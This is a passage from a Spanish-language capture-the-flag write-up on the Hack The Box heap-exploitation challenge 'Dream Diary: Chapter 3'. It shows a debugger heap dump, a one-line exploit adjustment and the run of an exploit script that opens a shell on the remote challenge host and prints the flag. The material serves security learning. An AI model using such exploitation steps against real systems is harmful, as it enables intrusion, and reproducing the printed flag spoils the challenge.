</code></pre></div><p>Más información sobre estos trucos en <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash">HackTricks</a>.</p><h2 id="_flag_"><em>Flag</em></h2><p>Para ejecutar el <em>exploit</em> de forma remota, necesitamos restar <code>0x410</code> a la dirección base del <em>heap</em> porque hay un <em>chunk</em> liberado que aparece en el entorno local pero no aparece cuando se ejecuta detrás del servicio <code>xinetd</code>. Me refiero a este <em>chunk</em>, que contiene la cadena del <em>banner</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">diary3</span>
Reading symbols from <span class="code-dark-green">diary3</span>...
(No debugging symbols found in <span class="code-dark-green">diary3</span>)
Use Pwndbg's <span class="code-dark-yellow">config</span> and <span class="code-dark-yellow">theme</span> commands to tune its configuration and theme colors!
<span class="code-red">pwndbg&gt; </span>run
Starting program: ./diary3
Welcome to Dream Diary: Chapter 3!  The return of a Dream Diary with modern protections!  
1. write about dream
2. edit dream
3. delete dream
4. recount dream
5. exit diary
&gt; ^C
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0x00007ffff7eedf81</span> in <span class="code-dark-yellow">read</span> () from <span class="code-dark-green">./libc.so.6</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vis_heap_chunks
<span class="code-dark-yellow">pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.</span>  
<span class="code-dark-yellow">This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.</span>


0x55555555b000  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000251</span>      <span class="code-dark-cyan">........Q.......</span>
0x55555555b010  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
0x55555555b020  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
0x55555555b030  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
...
0x55555555b240  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
0x55555555b250  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000411</span>      <span class="code-dark-magenta">................</span>
0x55555555b260  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
0x55555555b270  <span class="code-dark-magenta">0x203a797261694420</span>      <span class="code-dark-magenta">0x2072657470616843</span>      <span class="code-dark-magenta"> Diary: Chapter</span>
0x55555555b280  <span class="code-dark-magenta">0x2065685420202133</span>      <span class="code-dark-magenta">0x6f206e7275746572</span>      <span class="code-dark-magenta">3!  The return o</span>
0x55555555b290  <span class="code-dark-magenta">0x6165724420612066</span>      <span class="code-dark-magenta">0x207972616944206d</span>      <span class="code-dark-magenta">f a Dream Diary</span>
0x55555555b2a0  <span class="code-dark-magenta">0x646f6d2068746977</span>      <span class="code-dark-magenta">0x746f7270206e7265</span>      <span class="code-dark-magenta">with modern prot</span>
0x55555555b2b0  <span class="code-dark-magenta">0x21736e6f69746365</span>      <span class="code-dark-magenta">0x000000000000000a</span>      <span class="code-dark-magenta">ections!........</span>
0x55555555b2c0  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
...
0x55555555b640  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
0x55555555b650  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">................</span>
0x55555555b660  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-green">0x00000000000209a1</span>      <span class="code-dark-green">................</span>         &lt;-- Top chunk
</code></pre></div><p>Entonces, esta modificación menor en el <em>exploit</em> hará que funcione:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">-=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">410</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk6">0</span>  
</code></pre></div><p>Ahora podemos obtener una <em>shell</em> en la instancia remota y leer la <em>flag</em> con los trucos anteriores:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.122.104.91:31413
[<span class="code-blue">*</span>] './diary3'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./'</span>
[<span class="code-green">+</span>] Opening connection to 134.122.104.91 on port 31413: Done
[<span class="code-blue">*</span>] Heap base address: 0x55bab1eb9000
[<span class="code-green">+</span>] Glibc base address: 0x7fc444794000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> echo *
bin cant_guess_me_f14G.txt dev diary3 ld-2.29.so lib lib64 libc.so.6 start.sh  
<span class="code-red">$</span> while read line; do echo $line; done &lt; cant_guess_me_f14G.txt
HTB{m0d3rN_Nu11_bYT3+s3cC0mP_b1@Ck1i5t1Ng=&gt;n0t_s0_S@f3!!!}
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Dream%20Diary%3A%20Chapter%203/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#reglas-seccomp">Reglas <code>seccomp</code></a></li><li><a href="#opciones-del-programa">Opciones del programa</a></li><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-edición">Función de edición</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#función-de-información">Función de información</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li><li><a href="#_null-byte-poisoning_"><em>Null byte poisoning</em></a></li><li><a href="#rop-_chain_">ROP <em>chain</em></a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>